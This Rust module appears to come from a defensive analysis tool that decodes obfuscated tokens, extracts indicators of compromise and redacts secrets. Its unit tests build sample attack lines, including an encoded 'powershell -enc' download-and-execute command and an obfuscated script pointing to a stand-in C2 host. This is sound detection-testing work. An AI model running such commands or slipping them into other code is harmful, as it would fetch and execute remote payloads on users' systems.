use std::collections::HashSet;

use serde::Serialize;

use crate::analysis::entropy::{
    EntropyReport, analyze as analyze_entropy, analyze_bytes as entropy_bytes,
};
use crate::analysis::{AnalysisReport, Analyzer, EncodingKind, Layer};
use crate::ioc::{ExtractOptions, IocKind, IocReport, extract};

const MAX_TOKEN_BYTES: usize = 1024 * 1024;
/// Upper bound on indicators added from decoded layers across one input.
const MAX_DECODED_IOCS: usize = 10_000;
const MAX_SCRIPT_LINE_BYTES: usize = 64 * 1024;
const MAX_EXTRACTED_TEXT_BYTES: usize = 8 * 1024 * 1024;

#[derive(Debug, Clone, Serialize)]
pub struct BatchReport {
    pub input_bytes: usize,
    pub tokens_scanned: usize,
    pub token_limit_reached: bool,
    pub analyses: Vec<TokenAnalysis>,
    pub iocs: IocReport,
    pub entropy: EntropyReport,
    pub positions_available: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub binary: Option<BinaryInfo>,
}

#[derive(Debug, Clone, Serialize)]
pub struct BinaryInfo {
    pub detected_format: String,
    pub extracted_strings: usize,
    pub container_layers: Vec<Layer>,
}

#[derive(Debug, Clone, Serialize)]
pub struct TokenAnalysis {
    pub line: Option<usize>,
    pub token: String,
    pub report: AnalysisReport,
}

pub fn analyze(input: &str, max_depth: u8, max_tokens: usize) -> BatchReport {
    analyze_with_source(input, max_depth, max_tokens, "input")
}

pub fn analyze_with_source(
    input: &str,
    max_depth: u8,
    max_tokens: usize,
    source: &str,
) -> BatchReport {
    let analysis_input = crate::ioc::redact_sensitive_text(input);
    let analyzer = Analyzer::new(max_depth);
    let mut seen = HashSet::new();
    let mut analyses = Vec::new();
    let mut tokens_scanned = 0;
    let mut token_limit_reached = false;

    'lines: for (line_index, line) in analysis_input.lines().enumerate() {
        // Script obfuscation such as `[char]72 + [char]105` spans whitespace,
        // so lines with such constructs are also analyzed as a whole.
        let statement = line.trim();
        if statement.len() <= MAX_SCRIPT_LINE_BYTES
            && has_script_hint(statement)
            && seen.insert(statement.to_owned())
        {
            if tokens_scanned >= max_tokens {
                token_limit_reached = true;
                break 'lines;
            }
            tokens_scanned += 1;
            let report = analyzer.analyze(statement);
            if report
                .layers
                .first()
                .is_some_and(|layer| layer.kind.is_script_transform())
            {
                analyses.push(TokenAnalysis {
                    line: Some(line_index + 1),
                    token: statement.to_owned(),
                    report,
                });
            }
        }
        for raw_token in line.split_whitespace() {
            let token = clean_token(raw_token);
            if token.len() < 4 || token.len() > MAX_TOKEN_BYTES || !seen.insert(token.to_owned()) {
                continue;
            }
            if tokens_scanned >= max_tokens {
                token_limit_reached = true;
                break 'lines;
            }
            tokens_scanned += 1;

            let report = analyzer.analyze(token);
            if !report.layers.is_empty() || !report.findings.is_empty() {
                analyses.push(TokenAnalysis {
                    line: Some(line_index + 1),
                    token: token.to_owned(),
                    report,
                });
            }
        }
    }

    let mut iocs = extract(
        input,
        ExtractOptions {
            source: source.to_owned(),
            ..ExtractOptions::default()
        },
    );
    merge_decoded_iocs(&mut iocs, &analyses, source);

    BatchReport {
        input_bytes: input.len(),
        tokens_scanned,
        token_limit_reached,
        analyses,
        iocs,
        entropy: analyze_entropy(input),
        positions_available: true,
        binary: None,
    }
}

/// Analyzes text recovered from file structure (for example shortcut
/// arguments) and merges new analyses and indicators into `report` without
/// positions, since they do not map to lines of the original input.
pub fn merge_supplementary_text(
    report: &mut BatchReport,
    text: &str,
    max_depth: u8,
    max_tokens: usize,
    source: &str,
) {
    if text.trim().is_empty() {
        return;
    }
    let remaining = max_tokens.saturating_sub(report.tokens_scanned);
    let extra = analyze_with_source(text, max_depth, remaining, source);
    report.tokens_scanned += extra.tokens_scanned;
    report.token_limit_reached |= extra.token_limit_reached;
    let mut known_tokens = report
        .analyses
        .iter()
        .map(|analysis| analysis.token.clone())
        .collect::<HashSet<_>>();
    for mut analysis in extra.analyses {
        if known_tokens.insert(analysis.token.clone()) {
            analysis.line = None;
            report.analyses.push(analysis);
        }
    }
    let mut known = report
        .iocs
        .iocs
        .iter()
        .map(|ioc| (ioc.kind, ioc.value.clone()))
        .collect::<HashSet<(IocKind, String)>>();
    let before = report.iocs.iocs.len();
    for mut ioc in extra.iocs.iocs {
        if !known.insert((ioc.kind, ioc.value.clone())) {
            continue;
        }
        ioc.first_line = None;
        ioc.last_line = None;
        ioc.first_column = None;
        ioc.locations.clear();
        ioc.locations_truncated = false;
        report.iocs.iocs.push(ioc);
    }
    report.iocs.match_limit_reached |= extra.iocs.match_limit_reached;
    if report.iocs.iocs.len() > before {
        report.iocs.iocs.sort_by(|left, right| {
            left.kind
                .cmp(&right.kind)
                .then_with(|| left.value.cmp(&right.value))
        });
        report.iocs.total = report.iocs.iocs.len();
        report.iocs.total_occurrences = report.iocs.iocs.iter().map(|ioc| ioc.occurrences).sum();
    }
}

/// Cheap prefilter for whole-line script deobfuscation.
fn has_script_hint(line: &str) -> bool {
    static HINT: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    HINT.get_or_init(|| {
        regex::Regex::new(
            r#"(?i)fromcharcode|\[char|\bchrw?\$?\s*\(|-bxor|\\x[0-9a-f]{2}|\.reverse\(|\]\s*-join|['"]\s*-f\s*['"]|['"]\s*[+&]\s*['"]"#,
        )
        .expect("valid script hint regex")
    })
    .is_match(line)
}

/// Adds indicators that only appear after decoding, such as a URL inside a
/// Base64 UTF-16LE PowerShell command. Their line is the encoded token's line;
/// columns and context are omitted because they would describe decoded text.
fn merge_decoded_iocs(report: &mut IocReport, analyses: &[TokenAnalysis], source: &str) {
    let mut known = report
        .iocs
        .iter()
        .map(|ioc| (ioc.kind, ioc.value.clone()))
        .collect::<HashSet<(IocKind, String)>>();
    let mut added = 0;
    'analyses: for analysis in analyses {
        if analysis.report.layers.is_empty() {
            continue;
        }
        let chain = analysis
            .report
            .layers
            .iter()
            .map(|layer| layer.kind.to_string())
            .collect::<Vec<_>>()
            .join(" → ");
        let decoded = extract(
            &analysis.report.final_value,
            ExtractOptions {
                source: format!("{source} (decoded)"),
                ..ExtractOptions::default()
            },
        );
        for mut ioc in decoded.iocs {
            if !known.insert((ioc.kind, ioc.value.clone())) {
                continue;
            }
            if added == MAX_DECODED_IOCS {
                report.match_limit_reached = true;
                break 'analyses;
            }
            added += 1;
            ioc.detail = Some(match ioc.detail.take() {
                Some(detail) => format!("{detail}; decoded from {chain}"),
                None => format!("decoded from {chain}"),
            });
            ioc.first_line = analysis.line;
            ioc.last_line = analysis.line;
            ioc.first_column = None;
            ioc.locations.clear();
            ioc.locations_truncated = false;
            report.iocs.push(ioc);
        }
    }
    if added > 0 {
        report.iocs.sort_by(|left, right| {
            left.kind
                .cmp(&right.kind)
                .then_with(|| left.value.cmp(&right.value))
        });
        report.total = report.iocs.len();
        report.total_occurrences = report.iocs.iter().map(|ioc| ioc.occurrences).sum();
    }
}

pub fn analyze_bytes(input: &[u8], max_depth: u8, max_tokens: usize) -> BatchReport {
    analyze_bytes_with_source(input, max_depth, max_tokens, "input")
}

pub fn analyze_bytes_with_source(
    input: &[u8],
    max_depth: u8,
    max_tokens: usize,
    source: &str,
) -> BatchReport {
    if let Ok(text) = std::str::from_utf8(input) {
        return analyze_with_source(text, max_depth, max_tokens, source);
    }

    let container = Analyzer::new(max_depth).analyze_bytes(input);
    let compression = container.layers.first().and_then(|layer| match layer.kind {
        EncodingKind::Gzip => Some("gzip"),
        EncodingKind::Zlib => Some("zlib"),
        _ => None,
    });
    let (analysis_text, extracted_strings) = if compression.is_some() {
        (container.final_value.clone(), 0)
    } else {
        extract_printable_strings(input)
    };
    let mut report = analyze_with_source(&analysis_text, max_depth, max_tokens, source);
    report.input_bytes = input.len();
    report.entropy = entropy_bytes(input);
    report.positions_available = false;
    for analysis in &mut report.analyses {
        analysis.line = None;
    }
    report.iocs.positions_available = false;
    for ioc in &mut report.iocs.iocs {
        ioc.first_line = None;
        ioc.last_line = None;
        ioc.first_column = None;
        ioc.locations.clear();
        ioc.locations_truncated = false;
    }
    let mut container_layers = container.layers;
    for layer in &mut container_layers {
        layer.input = crate::ioc::redact_sensitive_text(&layer.input);
        layer.output = crate::ioc::redact_sensitive_text(&layer.output);
    }
    report.binary = Some(BinaryInfo {
        detected_format: compression.unwrap_or("unknown").to_owned(),
        extracted_strings,
        container_layers,
    });
    report
}

fn extract_printable_strings(input: &[u8]) -> (String, usize) {
    let mut output = String::new();
    let mut run = Vec::new();
    let mut count = 0;

    for byte in input.iter().copied().chain(std::iter::once(0)) {
        if byte.is_ascii_graphic() || byte == b' ' {
            run.push(byte);
            continue;
        }
        if run.len() >= 4 && output.len() + run.len() < MAX_EXTRACTED_TEXT_BYTES {
            if !output.is_empty() {
                output.push('\n');
            }
            output.push_str(std::str::from_utf8(&run).expect("printable ASCII is UTF-8"));
            count += 1;
        }
        run.clear();
    }
    (output, count)
}

fn clean_token(value: &str) -> &str {
    value.trim_matches(|character: char| {
        matches!(
            character,
            '"' | '\'' | '`' | ',' | ';' | '(' | ')' | '[' | ']' | '{' | '}'
        )
    })
}

#[cfg(test)]
mod tests {
    use std::io::Write;

    use flate2::Compression;
    use flate2::write::GzEncoder;

    use super::{analyze, analyze_bytes};

    #[test]
    fn analyzes_multiple_encoded_tokens_and_iocs() {
        let report = analyze("aGVsbG8= 68656c6c6f source=8.8.8.8", 8, 100);
        assert_eq!(report.analyses.len(), 3);
        assert_eq!(report.analyses[0].report.final_value, "hello");
        assert_eq!(report.analyses[0].line, Some(1));
        assert!(report.iocs.iocs.iter().any(|ioc| ioc.value == "8.8.8.8"));
        assert!(report.positions_available);
    }

    #[test]
    fn reports_token_limit() {
        let report = analyze("alpha beta gamma", 8, 1);
        assert!(report.token_limit_reached);
        assert_eq!(report.tokens_scanned, 1);
    }

    #[test]
    fn analyzes_raw_gzip_input() {
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder
            .write_all(b"aGVsbG8= source=8.8.8.8")
            .expect("compress");
        let bytes = encoder.finish().expect("finish gzip");

        let report = analyze_bytes(&bytes, 8, 100);
        assert_eq!(
            report.binary.as_ref().expect("binary info").detected_format,
            "gzip"
        );
        assert!(
            report
                .analyses
                .iter()
                .any(|item| item.report.final_value == "hello")
        );
        assert!(report.iocs.iocs.iter().any(|ioc| ioc.value == "8.8.8.8"));
        assert!(!report.positions_available);
        assert!(
            report
                .analyses
                .iter()
                .all(|analysis| analysis.line.is_none())
        );
        assert!(
            report
                .iocs
                .iocs
                .iter()
                .all(|ioc| ioc.first_line.is_none() && ioc.locations.is_empty())
        );
    }

    #[test]
    fn redacts_secrets_from_compressed_container_previews() {
        let secret = "AKIA1234567890ABCDEF";
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder
            .write_all(format!("api_key={secret}").as_bytes())
            .expect("compress");
        let bytes = encoder.finish().expect("finish gzip");

        let report = analyze_bytes(&bytes, 8, 100);
        let serialized = serde_json::to_string(&report).expect("serialize report");
        assert!(!serialized.contains(secret));
        assert!(serialized.contains("redacted"));
    }

    #[test]
    fn extracts_indicators_that_only_exist_after_decoding() {
        use base64::Engine as _;
        let command = "IEX (iwr 'http://stage.example.test/a')";
        let utf16 = command
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect::<Vec<_>>();
        let encoded = base64::engine::general_purpose::STANDARD.encode(utf16);
        let input = format!(
            "first line
powershell -enc {encoded}
"
        );

        let report = analyze(&input, 8, 100);
        let url = report
            .iocs
            .iocs
            .iter()
            .find(|ioc| ioc.value == "http://stage.example.test/a")
            .expect("decoded URL is extracted");
        assert_eq!(url.source, "input (decoded)");
        assert_eq!(url.first_line, Some(2));
        assert_eq!(url.first_column, None);
        assert!(url.locations.is_empty());
        assert_eq!(
            url.detail.as_deref(),
            Some("decoded from Base64 → UTF-16LE")
        );
        assert_eq!(report.iocs.total, report.iocs.iocs.len());
    }

    #[test]
    fn decoded_indicators_do_not_duplicate_plain_ones_or_leak_secrets() {
        use base64::Engine as _;
        let secret = "s3cr3t-value-123456";
        let hidden = format!("http://dup.example.test/ password={secret}");
        let encoded = base64::engine::general_purpose::STANDARD.encode(hidden);
        let input = format!("http://dup.example.test/ {encoded}");

        let report = analyze(&input, 8, 100);
        let urls = report
            .iocs
            .iocs
            .iter()
            .filter(|ioc| ioc.value == "http://dup.example.test/")
            .collect::<Vec<_>>();
        assert_eq!(urls.len(), 1);
        assert_eq!(urls[0].source, "input");
        let serialized = serde_json::to_string(&report.iocs).expect("serialize IOCs");
        assert!(!serialized.contains(secret));
    }

    #[test]
    fn analyzes_obfuscated_script_lines_as_a_whole() {
        let input = concat!(
            "Write-Host ready\n",
            "$u = 'ht' + 'tp://' + 'c2.exam' + 'ple.test/p'; iex ([char]105 + [char]101 + [char]120)\n",
        );
        let report = analyze(input, 8, 100);
        let line = report
            .analyses
            .iter()
            .find(|analysis| analysis.line == Some(2) && analysis.token.starts_with("$u ="))
            .expect("whole-line analysis");
        assert!(line.report.layers[0].kind.is_script_transform());
        let url = report
            .iocs
            .iocs
            .iter()
            .find(|ioc| ioc.value == "http://c2.example.test/p")
            .expect("deobfuscated URL");
        assert_eq!(url.source, "input (decoded)");
        assert_eq!(url.first_line, Some(2));
    }
}
